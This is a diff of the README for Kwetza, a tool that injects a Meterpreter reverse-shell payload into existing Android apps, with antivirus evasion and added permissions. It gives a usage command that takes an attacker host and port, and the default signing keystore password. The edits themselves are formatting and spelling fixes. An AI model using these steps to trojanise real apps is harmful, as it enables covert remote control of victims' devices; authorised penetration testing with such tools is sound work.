@@ -1,25 +1,26 @@
-#Introduction
+# Introduction
 By Chris Le Roy (@brompwnie) chris@sensepost.com
 
 Kwetza is a tool that allows you to infect an existing Android application with a Meterpreter payload.
 
-#What does it do?
-Kwetza infects an existing Android application with either custom or default payload templates to avoid detection by antivirus. Kwetza allows you to infect Android applications using the target application's default permissions or inject additional permissons to gain additional functionality.
+# What does it do?
 
-#Getting the code
+Kwetza infects an existing Android application with either custom or default payload templates to avoid detection by antivirus. Kwetza allows you to infect Android applications using the target application's default permissions or inject additional permissions to gain additional functionality.
+
+# Getting the code
 
 Firstly get the code:
 ```
 git clone https://github.com/sensepost/kwetza.git
 ```
 
-Kwetza is written in Python and requires BeautfiulSoup which can be installed using Pip:
+Kwetza is written in Python and requires BeautifulSoup which can be installed using Pip:
 ```
 pip install beautifulsoup4
 ```
 Kwetza requires Apktool to be install and accessible via your PATH. This can be setup using the install instructions located here: https://ibotpeaches.github.io/Apktool/install
 
-#Usage
+# Usage
 
 python kwetza.py nameOfTheApkToInfect.apk LHOST LPORT yes/no
 
@@ -66,12 +67,20 @@ jar signed.
 ```
 
 
-#Information
+# Information
 
-Kwetza has been developed to work with Python 2. Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk. If you would like to sign the
-infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the 
-reference in the kwetza.py. The same can be done for payload templates. The password for the default keystore is, well, "password".
+Kwetza has been developed to work with Python 2.
 
-#License
+Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk.
 
-Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0) Permissions beyond the scope of this license may be available at http://sensepost.com/contact.
+If you would like to sign the infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the reference in the kwetza.py.
+
+The same can be done for payload templates.
+
+The password for the default keystore is, well, "password".
+
+# License
+
+Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).
+
+Permissions beyond the scope of this license may be available at http://sensepost.com/contact
